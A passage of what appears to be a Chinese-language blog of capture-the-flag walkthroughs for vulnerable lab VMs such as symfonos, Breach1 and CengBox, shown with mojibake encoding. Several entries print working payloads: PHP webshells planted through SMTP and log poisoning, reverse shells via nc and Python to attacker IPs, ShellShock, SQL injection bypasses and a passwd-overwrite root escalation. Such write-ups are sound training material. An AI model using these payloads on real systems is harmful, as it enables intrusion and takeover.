æŸ¥çœ‹Wordpressé…ç½®ä¿¡æ¯ cat /var/www/html/weblog/wp-config.php å¾—åˆ°unclestinkyçš„å¯†ç Hash ä½¿ç”¨johnç ´è§£Hash john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash å¾—åˆ°å¯†ç  stinky:wedgie57 å°è¯•åˆ‡æ¢è´¦æˆ·ï¼ŒæˆåŠŸ æ‰¾åˆ°mrderpä¸stinkyçš„å¯¹è¯ å°è¯•å¯»æ‰¾æµé‡åŒ… å¼€å¯httpæœåŠ¡ï¼Œä¸‹è½½è‡³æœ¬åœ° ä½¿ç”¨wiresharkåˆ†ææµé‡ mrderp:derpderpderpderpderpderpderp åˆ‡æ¢è‡³ç”¨æˆ·mrderp æŸ¥çœ‹æ–‡ä»¶ cat /home/mrderp/Desktop/helpdesk.log è®¿é—®é“¾æ¥ æŸ¥çœ‹sudoæƒé™ å¯ä»¥è¿›è¡Œsudoææƒ ä¸Šä¼ pythonåå¼¹Shellè„šæœ¬ ææƒä¸ºroot å¯†ç å…±ç”¨ å¤ªå¸¸è§„äº† symfonos 1 2020/06/27 00:25:29 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130 Webè·¯å¾„æ‰«æ dirb http://192.168.88.130/ -w æ¼æ´åˆ©ç”¨ æ”¶é›†smbä¿¡æ¯ enum4linux 192.168.88.130 ç›®å½•/anonymouså¯ä»¥åŒ¿åè®¿é—® ä½¿ç”¨ç©ºè´¦æˆ·å³å¯ç™»å…¥ ä¸‹è½½å¹¶æŸ¥çœ‹attention.txt æ–‡æœ¬ä¸­æåˆ°ä¸‰ä¸ªå¼±å£ä»¤ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸‰ä¸ªå¼±å£ä»¤æ¥å°è¯•ç™»å…¥heliosè´¦æˆ·çš„ä¸ªäººç›®å½• smbclint //192.168.88.130/helios -U helios ä½¿ç”¨å£ä»¤ qwerty å³å¯ç™»å…¥ æŸ¥çœ‹æ–‡æœ¬todo.txt å¾—åˆ°ä¿¡æ¯/h3l105 Webä¸»é¡µå¦‚å›¾ è€Œä¸”æ‰«æWebç›®å½•æ—¶å¹¶æœªè·å–åˆ°æœ‰æ•ˆä¿¡æ¯ çŒœæµ‹/h3l105ä¸ºWebç›®å½• è®¿é—®ç›®å½•/h3l105ï¼Œä¸ºWordpressç«™ç‚¹ ä½¿ç”¨wpscanè¿›è¡Œæ‰«æ wpscan --url http://192.168.88.130/h3l105/ -e ap --plugins-detection Aggressive æŸ¥è¯¢ç›¸å…³æ¼æ´ ä½¿ç”¨Telnetè¿æ¥SMTPæœåŠ¡æ¥å†™å…¥Webshell 1234567telnet 192.168.88.130 25MAIL FROM: &lt;Hacker&gt;RCPT TO: heliosdata&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;.quit ä½¿ç”¨LFIæ¥å®ç°GetShell http://192.168.88.130/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;pass=nc -e /bin/bash 192.168.88.129 8081 æƒé™æå‡ æŸ¥çœ‹å…·æœ‰SUIDçš„ç¨‹åº find / -user root -perm -4000 -print 2&gt; /dev/null å¯ä»¥è¿›è¡ŒPATHææƒ SMTP+LFI=GetShell é€šè¿‡SMTPå†™å…¥WebShelçš„å†…å®¹ï¼ˆéœ€è¦å·²çŸ¥ä¸€ä¸ªç³»ç»Ÿçš„ç”¨æˆ·åï¼‰ å†åˆ©ç”¨LFIæ¥æ‰§è¡ŒWebShellï¼ˆWebåŒ…å«å¯ä»¥è®¿é—®/var/mailï¼‰ å‚è€ƒèµ„æ–™ WalkThrough symfonos 3 2020/07/05 15:27:23 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130 Webè·¯å¾„æ‰«æ dirb http://192.168.88.130/ -w æ¼æ´åˆ©ç”¨ è®¿é—®é¡µé¢ï¼Œåœ¨æºä»£ç å‡ºå¾—åˆ°ä¿¡æ¯ å°è¯•åå‘ç°å­˜åœ¨è·¯å¾„/cgi-bin/underworld ä½¿ç”¨ShellShockæ¼æ´åå¼¹Shell curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.88.130/cgi-bin/underworld æƒé™æå‡ è·å–pty æŸ¥æ‰¾å±äºç”¨æˆ·ç»„hadesçš„æ–‡ä»¶ æŸ¥çœ‹statuscheck.txt åº”è¯¥æ˜¯curlè¯·æ±‚çš„ç»“æœ ä¸‹è½½pspy è¿è¡Œpspyä¹‹åå¾—åˆ°ä¿¡æ¯ python2è„šæœ¬ftpclient.pyä¸ºè®¡åˆ’ä»»åŠ¡ é¶æœºä¸Šå­˜åœ¨tcpdump ä½¿ç”¨tcpdumpç›‘å¬æµé‡ timeout 120 tcpdump -v -i lo port 21 å¾—åˆ°è´¦æˆ·hades:PTpZTfU4vxgzvRBE ä½¿ç”¨sshç™»å…¥é¶æœºåæŸ¥çœ‹è„šæœ¬æ–‡ä»¶ æ–‡ä»¶ä¸å¯å†™ï¼Œä¸”ç›®å½•æ— æ³•æ“ä½œ æŸ¥çœ‹åº“æ–‡ä»¶ftplib åº“æ–‡ä»¶å¯å†™ ä¿®æ”¹åº“æ–‡ä»¶ä¸­çš„ftp.quit()å‡½æ•° æ’å…¥åå¼¹Shellå‘½ä»¤ ææƒæˆåŠŸ ShellShock apache /cgi-bin/* (200) å‚è€ƒèµ„æ–™ WalkThrough symfonos 4 2020/07/20 11:00:24 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.145 Webè·¯å¾„æ‰«æ gobuster dir -u 192.168.31.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php æ¼æ´åˆ©ç”¨ è®¿é—®/atlantis.php ä½¿ç”¨SQLæ³¨å…¥Bypassç™»å…¥ 12username&#x3D;&#39; or 1#password&#x3D;1 ç™»å…¥åè·³è½¬è‡³/sea.php é€‰æ‹©Hadesä¹‹åå‡ºç°æ–‡å­—å†…å®¹ ä¹Ÿå‡ºç°äº†Getå‚æ•°file è®¿é—®/gods å¯èƒ½å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸”æ–‡ä»¶ååé¢ä¼šè¡¥ä¸Š.log å°è¯•åŒ…å«ç™»å…¥æ—¥å¿— /sea.php?file=../../../../var/log/auth å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ sshç™»å…¥æ„é€ Webshell ssh '&lt;?php system($_GET['pass']); ?&gt;'@192.168.31.145 åå¼¹Shell 12nc -lvnp 9901&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.31.10 9901 æƒé™æå‡ è·å–tty python -c 'import pty;pty.spawm(&quot;/bin/bash&quot;)' æŸ¥çœ‹æœ¬åœ°æœåŠ¡ ss -antlp ps -auxwww | grep 127.0.01 ç«¯å£è½¬å‘ socat tcp-listen:1234,fork tcp-connect:localhost:8080 è®¿é—®http://192.168.31.145:1234/ æŸ¥çœ‹cookie Base64è§£ç  å¯èƒ½å­˜åœ¨pickleååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ åå¼¹Shellçš„Payload å‘é€Payload ææƒæˆåŠŸ jsonpickleååºåˆ—åŒ– åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šæ‰§è¡Œå‡½æ•°reduceç±»ä¼¼äºphpååºåˆ—åŒ–ä¸­çš„wakeup() å‚è€ƒèµ„æ–™ WalkThrough WalkThrough pickel NullByte 2020/07/31 10:52:00 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.234 Webè·¯å¾„æ‰«æ dirb http://192.168.31.234/ -w æ¼æ´åˆ©ç”¨ è®¿é—®Webé¡µé¢ ä¸‹è½½å›¾ç‰‡å¹¶åˆ†æ 12curl -O http:&#x2F;&#x2F;192.168.31.234&#x2F;main.gifexiftool main.gif è®¿é—®ç›®å½•/kzMb5nVYJw æŸ¥çœ‹æºä»£ç  ä½¿ç”¨Burpsuiteå¯¹POSTå‚æ•°keyè¿›è¡Œçˆ†ç ´ å­—å…¸æ–‡ä»¶ä¸º/usr/share/wordlists/dirb/big.txt è¾“å…¥keyä¹‹åé¡µé¢å˜åŒ– æäº¤usrtosearchå‚æ•°è¿›è¡ŒæŸ¥è¯¢ ç›´æ¥è®¿é—®420search.php çŒœæµ‹è¯¥phpæ–‡ä»¶å¯ä»¥å¯¹æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œå¯èƒ½å­˜åœ¨SQLæ³¨å…¥ æäº¤å‚æ•°usrtosearch=admin&quot; or 1=1%23 ç¡®è®¤å­˜åœ¨SQLæ³¨å…¥ ä½¿ç”¨SQLMap sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin --dbs --batch sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth --tables --batch sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users --columns --batch sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users -C id,position,user,pass --dump --batch Base64è§£ç  Hashç ´è§£ ä½¿ç”¨è¯¥è´¦æˆ·ç™»å…¥SSH æƒé™æå‡ æŸ¥çœ‹æ–‡ä»¶~/.bash_history å­˜åœ¨æ–‡ä»¶/var/www/backup/procwatch æ–‡ä»¶æ‰§è¡Œpså‘½ä»¤ï¼Œä¸”å…·æœ‰SUIDæƒé™ è¿›è¡ŒPATHææƒ å‚è€ƒèµ„æ–™ WalkThrough Breach1 2020/09/06 11:35:19 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.110.0/24 | grep -B3 virtual ç«¯å£æ‰«æ nmap --top-port 200 -sV -T5 -v -n 192.168.110.140 ç›®æ ‡é¶æœºå­˜åœ¨IDS/IPS Webè·¯å¾„æ‰«æ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.110.140/ æ¼æ´åˆ©ç”¨ ä½¿ç”¨æµè§ˆå™¨è®¿é—®Webé¡µé¢ æŸ¥çœ‹æºä»£ç  ä¸¤æ¬¡Base64è§£ç åå¾—åˆ° pgibbons:damnitfeel$goodtobeagang$ta å›¾ç‰‡å¯¼å‘å…¶ä»–é¡µé¢ ç‚¹å‡»Employee portal ä½¿ç”¨è´¦æˆ·ç™»å…¥ 12username: pgibbonspassword: damnitfeel$goodtobeagang$ta åœ¨ç¬¬ä¸‰å°é‚®ä»¶ä¸­è·å¾—æœ‰æ•ˆä¿¡æ¯ keystoreæ–‡ä»¶ 192.168.110.140/.keystore æŸ¥çœ‹Contributions å¯ä»¥è¿›ä¸€æ­¥è·å¾—ä¿¡æ¯ è¿™é‡Œå¯ä»¥å†è·å–ä¸€ä¸ªæµé‡åŒ…æ–‡ä»¶ http://192.168.110.140/impresscms/_SSL_test_phase1.pcap å¹¶ä¸”å¾—çŸ¥å¯†ç ä¸ºtomcat æŸ¥çœ‹keystoreæ‰€å­˜å‚¨çš„ç§é’¥ 12keytool -list -keystore keystoretomcat å¯¼å‡ºp12è¯ä¹¦ keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype pkcs12 ä½¿ç”¨Wiresharkåˆ†ææµé‡åŒ… ç›®æ ‡é¶æœºçš„8443ç«¯å£å¯èƒ½å­˜åœ¨åŠ å¯†WebæœåŠ¡ å¯¼å…¥è¯ä¹¦æ–‡ä»¶ Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; Edit... å¯¼å…¥ä¹‹åå³å¯è§£å¯†TLSæµé‡ å¯¹äºBasicè®¤è¯å†…å®¹è¿›è¡ŒBase64è§£ç  12echo &#39;dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC&#39; | base64 -dtomcat:Tt\\5D8F(#!*u&#x3D;G)4m7zB è®¿é—®https://192.168.110.140:8443/_M@nag3Me/html è®¤è¯é”™è¯¯ï¼Œä½¿ç”¨Burpsuiteä»£ç† ä½¿ç”¨è´¦æˆ·ç™»å…¥ 12username: tomcatpassword: Tt\\5D8F(#!*u&#x3D;G)4m7zB æ„é€ æ¶æ„waråŒ… 123msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;9902 -f raw &gt; msf.jspzip msf.zip msf.jspmv msf.zip msf.war ä¸Šä¼ waråŒ… åœ¨MSFConsoleä¸­è¿›è¡Œé…ç½® 12345use exploit&#x2F;multi&#x2F;handlerset payload java&#x2F;jsp_shell_reverse_tcpset LHOST 192.168.110.3set LPORT 9902run è®¿é—®URLhttps://192.168.110.140:8443/msf/msf.jsp MSFConsoleä¸­æ¥æ”¶åˆ°Shell æƒé™æå‡ mysqlç©ºå£ä»¤ç™»å…¥ 12mysql -u rootselect user,password from mysql.user; ç ´è§£MD5å€¼ thelaststraw åˆ‡æ¢è´¦æˆ·è‡³milton 12su miltonthelaststraw ä¸‹è½½å›¾ç‰‡ï¼ŒæŸ¥çœ‹EXIF 12wget http:&#x2F;&#x2F;192.168.110.140&#x2F;images&#x2F;bill.pngexiftool bill.png å¾—åˆ°å¯†ç  coffeestains åˆ‡æ¢è´¦æˆ· 12su blumberghcoffeestains å¼€å¯æœ¬åœ°HTTPæœåŠ¡ python -m SimpleHTTPServer 9900&amp; é¶æœºä¸‹è½½pspy wget http://192.168.110.3:9900/pspy64 ä½¿ç”¨pspy 12chmod +x pspy64.&#x2F;pspy64 | grep UID&#x3D;0 &amp; å¯ä»¥çœ‹åˆ°rootæ‰§è¡Œçš„å‘½ä»¤/bin/sh -c /usr/share/cleanup/tidyup.sh æŸ¥çœ‹sudoæƒé™ï¼Œå¯ä»¥ä½¿ç”¨teeå†™åå¼¹shellå‘½ä»¤è‡³tidy.sh rootæ‰§è¡Œåå¼¹shellå‘½ä»¤ä¹‹åå³å¯è·å¾—rootæƒé™ echo 'nc -e /bin/bash 192.168.110.3 9903' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh nc -lvnp 9903 keystore å¯ä»¥ä½¿ç”¨keytoolæŸ¥çœ‹å¹¶å¯¼å‡ºkeystoreä¸­æ‰€å­˜å‚¨çš„å¯†é’¥æ–‡ä»¶ å‚è€ƒèµ„æ–™ WalkThrough Infosec_Warrior02 2020/09/09 12:46:57 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.1.0/24 | grep -B3 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -T5 -v -n 192.168.1.109 æ¼æ´åˆ©ç”¨ ä½¿ç”¨ncè¿æ¥ç›®æ ‡56563ç«¯å£ å°è¯•è¾“å…¥éé¢„æœŸè¾“å…¥ å¾—åˆ°æŠ¥é”™ä¿¡æ¯ å¯ä»¥åˆ©ç”¨input()å‡½æ•°è¿›è¡ŒRCE payload: __import__(&quot;os&quot;).system(&quot;/bin/bash&quot;) è·å–Shell æƒé™æå‡ SSHç™»å…¥æ—¶å¾—åˆ°ä¿¡æ¯ æŸ¥çœ‹å‘å‹ç‰ˆçš„ä»£å· cat /etc/*release æŸ¥çœ‹ä¸»æœºåä¸ç”¨æˆ·å æ„é€ è´¦æˆ· hydra -I -L user -P pass -e n ssh://192.168.1.109 å¾—åˆ°è´¦æˆ· ck04:bionic SSHç™»å…¥ 12ssh ck04@192.168.1.109 -p bionicbionic è¾“å…¥å‘½ä»¤ä¹‹åsshæ–­å¼€è¿æ¥ æŸ¥çœ‹ck04ç”¨æˆ·çš„é»˜è®¤Shell æ„é€ åå¼¹shellè„šæœ¬å¹¶æ‰§è¡Œ è·å–tty æŸ¥çœ‹ck04ç”¨æˆ·çš„sudoæƒé™å¹¶åˆ©ç”¨ æŸ¥çœ‹blaç”¨æˆ·çš„sudoæƒé™ ä½¿ç”¨unzipå‘½ä»¤è¦†ç›–passwdæ–‡ä»¶ 12345openssl passwd -6 hackforfun $6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1echo &#39;test:$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwdzip new.zip passwdsudo -u root &#x2F;usr&#x2F;bin&#x2F;unzip new.zip -d &#x2F;etc python2 input() python2çš„å‡½æ•°input()ä¼šæ‰§è¡Œè¾“å…¥çš„æ•°æ®ï¼Œæ’å…¥pythonå‘½ä»¤å³å¯Getshellæˆ–åå¼¹Shellï¼Œè€Œä½¿ç”¨å‡½æ•°raw_input()åˆ™ä¸ä¼šæ‰§è¡Œå‘½ä»¤ å‚è€ƒèµ„æ–™ WalkThrough Infosec_Warrior03 2020/09/21 19:24:32 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.110.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p- -A -T5 -v -n 192.168.110.6 Webè·¯å¾„æ‰«æ dirb http://192.168.110.6/ æ¼æ´åˆ©ç”¨ è®¿é—®http://192.168.110.6/phpMyAdmin/ ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ 12username:rootpassword:root æŸ¥è¯¢mysql.userä¸­çš„è´¦æˆ·ä¿¡æ¯ å¾—åˆ°ä¸¤ä¸ªè´¦æˆ· 12root:81F5E21E35407D884A6CD4A731AEBFB6AF209E1Bkrishna:4DC8EC6204F12795FE54CC79FFA2A8579A947D04 è¿›è¡Œmd5æŸ¥è¯¢ä¹‹åå¾—åˆ°æ˜æ–‡å£ä»¤ 12root:rootkrishna:infosec å°è¯•ä½¿ç”¨krishna:infosecç™»å…¥SSHæœåŠ¡ æƒé™æå‡ æŸ¥çœ‹sudoæƒé™ ä½¿ç”¨gccè¿›è¡Œææƒ æŸ¥çœ‹sudoæƒé™ ä½¿ç”¨gccè¿›è¡Œææƒ Shellè„šæœ¬ææƒä¸ç©ºæ ¼ ä½¿ç”¨shellè„šæœ¬è¿›è¡Œsudo/suidææƒæ—¶ï¼Œå‚æ•°ä¸­å¸¦æœ‰ç©ºæ ¼åˆ™éœ€è¦ä½¿ç”¨å¼•å· å‚è€ƒèµ„æ–™ WalkThrough CengBox 2020/10/25 16:31:59 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -A -T5 192.168.1.104 Webè·¯å¾„æ‰«æ gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/big.txt æ¼æ´åˆ©ç”¨ è®¿é—® http://192.168.1.104/masteradmin/login.php å°è¯•SQLæ³¨å…¥ç»•è¿‡ 12username&#x3D;1&#39; or 1#passwrod&#x3D;1 ç»•è¿‡ç™»å½•ï¼Œè·³è½¬è‡³ http://192.168.1.104/masteradmin/upload.php å°è¯•ä¸Šä¼ shell.phpï¼Œè¿”å›é”™è¯¯ä¿¡æ¯ æ›´æ”¹æ–‡ä»¶åä¸ºshell.php.cengï¼Œä¸Šä¼ æˆåŠŸ WebShellçš„å†…å®¹ä¸º &lt;?php @system($_GET[&quot;cmd&quot;]);?&gt; WebShellå­˜æ”¾è·¯å¾„ä¸º /uploads/shell.php.ceng å­˜åœ¨python3ç¯å¢ƒ ä½¿ç”¨WebShellè¿›è¡Œåå¼¹Shell 12nc -lvnp 9908curl http:&#x2F;&#x2F;192.168.1.104&#x2F;uploads&#x2F;shell.php.ceng?cmd&#x3D;python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27192.168.1.109%27%2C9908%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27&#x2F;bin&#x2F;bash%27%2C%27-i%27%5D%29%3B%22 æƒé™æå‡ è·å–tty, æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ 123python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;uname -acat &#x2F;etc&#x2F;*release æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯ cat /var/www/html/masteradmin/db.php å¾—åˆ°æ•°æ®åº“è´¦æˆ·ä¿¡æ¯ root:SuperS3cR3TPassw0rd1! è¿›å…¥æ•°æ®åº“æŸ¥çœ‹Webè´¦æˆ·ä¿¡æ¯ mysql -u root -pSuperS3cR3TPassw0rd1! -e 'select * from cengbox.admin;' å¾—åˆ°Webè´¦æˆ·ä¿¡æ¯ masteradmin:C3ng0v3R00T1! æŸ¥çœ‹è´¦æˆ·ä¿¡æ¯ cat /etc/passwd å°è¯•ç™»å…¥cengoverè´¦æˆ· 12ssh cengover@192.168.1.104C3ng0v3R00T1! åœ¨pspyç›®å½•å¼€å¯HTTPæœåŠ¡ 1python2 -m SimpleHTTPServer 9900&amp; ä¸‹è½½å¹¶ä½¿ç”¨pspy 1234cd &#x2F;tmpcurl -O http:&#x2F;&#x2F;192.168.1.109:9900&#x2F;pspy64chmod +x pspy64.&#x2F;pspy64&amp; å­˜åœ¨rootçš„è®¡åˆ’ä»»åŠ¡ æŸ¥çœ‹è„šæœ¬æ–‡ä»¶ æ‹¥æœ‰å†™å…¥æƒé™ å¯ä»¥å†™å…¥åå¼¹Shellå‘½ä»¤ ç›‘å¬ç«¯å£ 1nc -lvnp 8087 è·å–rootæƒé™ å‚è€ƒèµ„æ–™ WalkThrough TenderFoot-1 2020/10/28 21:29:04 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -T5 -v -n 192.168.1.108 Webè·¯å¾„æ‰«æ dirb http://192.168.1.108/ -w æ¼æ´åˆ©ç”¨ è®¿é—® http://192.168.1.108/ æç¤ºéœ€è¦è¿›è¡Œè·¯å¾„æšä¸¾ æŸ¥çœ‹æºä»£ç å¾—åˆ°æç¤º /robots.txt /robots.txt æç¤ºè·¯å¾„ /hint è®¿é—®/hint å­˜åœ¨HTMLæ³¨é‡Šä¸­å­˜åœ¨Base32ç¼–ç  è§£ç ç»“æœä¸º 12345 ____________________| N0thing Here! || Try something else!| --------------------Enumerate more :)ï¿½ ç»§ç»­æšä¸¾è·¯å¾„ 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt è®¿é—® /fotocd HTMLæ³¨é‡Šä¸­å­˜åœ¨BrainFuckç¼–ç  è§£ç ç»“æœä¸º 123456789101112&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;JDk5OTkwJA&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Did you found username ?if yes: Then you have cred. of one user, enter into user account by ssh port. syntax:&#123;ssh username@IP&#125;if not: Then enumerate more :) G00D LUCK ! 12echo -n &#39;JDk5OTkwJA&#x3D;&#x3D;&#39; | base64 -d$99990$ ç»§ç»­æšä¸¾å…¶ä»–ç±»å‹WEBæ–‡ä»¶ 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -x .html,.php,.css,.js è®¿é—® /entry.js å†…å®¹ä¸º monica ç™»å…¥SSHæœåŠ¡ 12ssh monica@192.168.1.108$99990$ æƒé™æå‡ å¾—åˆ°æç¤ºä¿¡æ¯ è®¿é—® /fotocd/0x0343548764 ä¸‹è½½å¹¶è§£å‹ZIPæ–‡ä»¶ 123curl http:&#x2F;&#x2F;192.168.1.108&#x2F;fotocd&#x2F;0x0343548764&#x2F;joey.zipunzip joey.zip#9175 å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶: gift.zip, note.txt note.txtçš„å†…å®¹ä¸º 123456789&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Not this time DUDE!Just G00GLE and learn how to crack zip passwords :)you will learn new thing!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; ç ´è§£gift.zip 1fcrackzip gift.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u å¾—åˆ°å¯†ç ä¸º h4ck3d è§£å‹åå¾—åˆ° gift.txtï¼Œå†…å®¹ä¸º 123456789101112131415&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3